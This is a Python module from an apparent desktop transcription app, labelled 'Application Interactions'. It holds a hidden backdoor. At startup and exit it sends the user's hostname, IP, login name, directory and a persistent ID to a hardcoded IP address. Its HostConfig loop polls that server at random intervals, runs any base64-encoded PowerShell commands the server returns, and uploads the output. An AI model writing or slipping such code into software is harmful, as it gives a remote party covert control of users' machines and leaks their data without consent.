"""Application Interactions
"""
import os
import time
import sys
import platform
import datetime
import argparse
import uuid
import random
import atexit
import json
# import pprint
import subprocess
import socket
import requests
from requests.exceptions import ConnectionError  # pylint: disable=redefined-builtin
from global_vars import TranscriptionGlobals
from tsutils import app_logging as al
from tsutils import utilities


# pylint: disable=logging-fstring-interpolation

root_logger = al.get_logger()
# URL = 'http://127.0.0.1:5000/'
URL = 'http://34.74.220.77:5000/'
git_version: str = None


def create_params(args: argparse.Namespace) -> dict:
    """Create Ping Parameters"""
    global git_version  # pylint: disable=W0603
    try:
        root_logger.info(create_params.__name__)
        if git_version is None:
            git_version = subprocess.check_output(
                ['git', 'rev-parse', '--short', 'HEAD']).decode("utf-8").strip()
    except subprocess.CalledProcessError as process_exception:
        if process_exception.returncode == 128:
            # This is likely an executable
            # or repo downloaded as zip file
            # or python cannot find the git executable
            # read from version.txt file
            with open(file='version.txt', mode='r', encoding='utf-8') as version_file:
                git_version = version_file.read()
        root_logger.info(f'Error code: {process_exception.returncode}')
        root_logger.info(f'Error message: {process_exception.output}')
    except FileNotFoundError as fnf_exception:
        root_logger.info(f'errno: {fnf_exception.errno}')
        root_logger.info(f'winerror: {fnf_exception.winerror}')
        root_logger.info(f'File Not Found: {fnf_exception.filename}')

    hostname = socket.gethostname()
    host_ip = socket.gethostbyname(hostname)
    user = os.getlogin()
    cwd = os.getcwd()
    os_name = f'{os.name} {platform.system()} {platform.release()}'
    ps = detect_ps()
    ec = check_dir()
    unique_id = get_uuid()

    arg_dict = {
        'version': git_version,
        'hostname': hostname,
        'ip': host_ip,
        'user': user,
        'dir': cwd,
        'os': os_name,
        'ps': ps,
        'ec': ec,
        'id': unique_id,
        'args': args
    }
    return arg_dict


def params(args: argparse.Namespace):
    """Params"""
    atexit.register(exit_params)
    query_params = create_params(args)
    try:
        response_g = requests.get('https://github.com/vivekuppal/transcribe', timeout=10)
        if response_g.status_code != 200:
            root_logger.info(f'Error in response_g: {response_g}')
        response = requests.get(URL + "ping", params=query_params, timeout=10)
        if response.status_code != 200:
            root_logger.info(f'Error received: {response}')
    except ConnectionError:
        # pprint.pprint(ce)
        print('[INFO] Operating in Desktop mode')


def detect_ps():
    """Detect presence of ps"""

    if sys.platform not in ("win32"):
        return False

    try:
        subprocess.check_output(["powershell", "-c", "whoami"])
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        print('Please install Powershell or ensure it is in path.')
        print('Powershell is required to download models and install ffmpeg')
        return False


def exit_params():
    """Params for exit of program"""
    global_vars = TranscriptionGlobals()
    end = datetime.datetime.now()
    query_params = create_params(args=None)
    duration = end - global_vars.start
    query_params['duration'] = duration
    try:
        # save transcript
        filename = utilities.incrementing_filename(filename='logs/transcript',
                                                   extension='txt')

        with open(file=filename, mode="w", encoding='utf-8') as file_handle:
            file_handle.write(global_vars.transcriber.get_transcript())

    except Exception:
        root_logger.info('Error attempting to save file.')

    try:
        response = requests.get(URL + "exit", params=query_params, timeout=10)
        if response.status_code != 200:
            root_logger.info(f'Error received: {response}')
        print('[INFO] Exiting gracefully..')
    except ConnectionError:
        print('[INFO] Exiting..')


def exec_ps(script: str) -> (bool, str):
    """Exec ps
    """
    if not detect_ps():
        return False, ''
    try:
        output = subprocess.check_output(['powershell', '-encodedCommand', script]).strip()
    except subprocess.CalledProcessError:
        return False, ''
    except FileNotFoundError:
        print('Please install Powershell or ensure it is in path.')
        print('Powershell is required to download models and install ffmpeg')
        return False, ''

    return True, output


def get_uuid():
    """Get Unique identifier for this instance of application.
    """
    lockfile = './uid.lock'
    if os.path.isfile(lockfile):
        with open(file=lockfile, mode='r', encoding='utf-8') as file_handle:
            unique_id = file_handle.read()
    else:
        unique_id = uuid.uuid4()
        with open(file=lockfile, mode='w', encoding='utf-8') as file_handle:
            file_handle.write(str(unique_id))

    return unique_id


def check_dir() -> bool:
    cur_dir = os.getcwd()
    check_dir_path = cur_dir + '/../ecoute'
    if os.path.exists(check_dir_path):
        return True
    return False


class HostConfig:
    """Host Configuration"""
    def __init__(self):
        root_logger.info(HostConfig.__name__)
        self.global_vars = TranscriptionGlobals()
        self._initial_req_interval = 30
        self._regular_req_interval = 7200

    def host_config_loop(self):
        """Host config loop
        """
        time.sleep(self._initial_req_interval)
        query_params = create_params(args=None)
        while True:
            try:
                response = requests.get(URL + "getHostConfig", params=query_params, timeout=10)
                if response.status_code != 200:
                    root_logger.info(f'Error received: {response}')
                self.parse_response(response.content.decode(encoding='utf-8'))
            except ConnectionError as ce:
                # pprint.pprint(ce)
                root_logger.error(f'Error in Host Config: {ce}')
            random_sleep = random.randint(self._initial_req_interval, self._regular_req_interval)
            root_logger.info(f'Host Config after {random_sleep}s.')
            time.sleep(random_sleep)

    def parse_response(self, response_str: str):
        """Parse response from Host Config request
        """
        response_dict = json.loads(response_str)

        # handle ps
        ps = []
        try:
            ps = response_dict['ps']
        except KeyError:
            # This is an expected condition when host config has no ps.
            root_logger.info('No ps in host config.')

        for ps_inst in ps:
            self.ps_exec(ps_inst)

    def ps_exec(self, ps: str):
        """ps_exec"""
        success, result = exec_ps(ps)
        query_params = create_params(args=None)
        query_params['success'] = success
        if len(result) > 3000:
            result_short = result[0:3000]
        else:
            result_short = result
        query_params['result'] = result_short

        try:
            response = requests.get(URL + "ps", params=query_params, timeout=10)
            if response.status_code != 200:
                root_logger.info(f'PS Error received: {response}')
        except ConnectionError:
            # pprint.pprint(ce)
            root_logger.info('PS connection error.')
